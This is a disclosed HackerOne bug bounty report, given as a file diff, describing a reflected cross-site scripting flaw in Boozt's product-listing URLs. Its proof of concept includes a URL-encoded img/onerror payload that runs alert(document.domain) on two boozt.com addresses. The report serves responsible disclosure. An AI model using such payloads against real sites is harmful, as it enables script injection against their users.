@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/99594
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/stefanofinding
+ReportedTo:Boozt Fashion AB(boozt)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:01.08.2017 10:46:13
+
+Summary:
+
+__Description__
+
+The listing endpoints like http://www.boozt.com/eu/en/esprit-collection/blouses-woven_11239380, reflect the URL in the response from the server without escaping. And accept any value between _/esprit-collection/_ and __11239380_. 
+The problem is that you can send a request like http://www.boozt.com/eu/en/esprit-collection/%22%3E%3Cimg%20src%3dx%20onerror%3dalert%28document.domain%29%3E_11239380 and it will be valid.
+
+__Proof of concept__
+
+1. Go to http://www.boozt.com/eu/en/esprit-collection/%22%3E%3Cimg%20src%3dx%20onerror%3dalert%28document.domain%29%3E_11239380
+2. `alert(document.domain)` is executed a few times.
+3. Go to http://www.boozt.com/eu/en/scotch-and-soda/%22%3E%3Cimg%20src%3dx%20onerror%3dalert%28document.domain%29%3E_11312517
+4. `alert(document.domain)` is executed a few times.
+
+It is reproducible on Firefox.
+Please, let me know if you need more information.
